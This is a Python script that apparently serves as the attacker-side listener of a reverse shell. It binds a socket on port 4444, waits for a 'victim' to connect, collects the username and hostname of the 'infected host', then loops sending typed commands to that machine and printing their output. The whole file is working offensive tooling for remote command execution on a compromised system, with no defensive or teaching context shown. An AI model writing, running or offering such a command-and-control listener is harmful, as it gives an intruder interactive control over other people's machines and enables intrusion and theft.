import socket
import time
host = '192.168.1.214'
port = 4444

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host,port))
    server.listen(1)
    print('[+] Listening for connection from victim...')
    client, client_addr = server.accept()
    print(f"[+] Connection has been received from victim {client_addr[0]}:{client_addr[1]} ")
except:
    print("[!] An error occurred.")
    exit()

# grab the hostname of the infected host
username = client.recv(1024).decode("utf-8")

# grab the username of the infected host
hostname = client.recv(1024).decode("utf-8")

print(f"[+] Shell successfully landed on host ({client_addr[0]})")
time.sleep(2)
print(f"[!] Logged in user: {username}, on hostname: {hostname}\n")
while True:
    pwd = client.recv(1024).decode("utf-8")
    cmd = str(input(f"({username})@({hostname}) - {pwd} : "))
    cmd_en = cmd.encode() # _en = encoded
    client.send(cmd_en)
    output = client.recv(1024).decode("utf-8")
    print(output)
    if cmd.upper() == 'EXIT':
        print('Closing server.')
        client.close()
        break
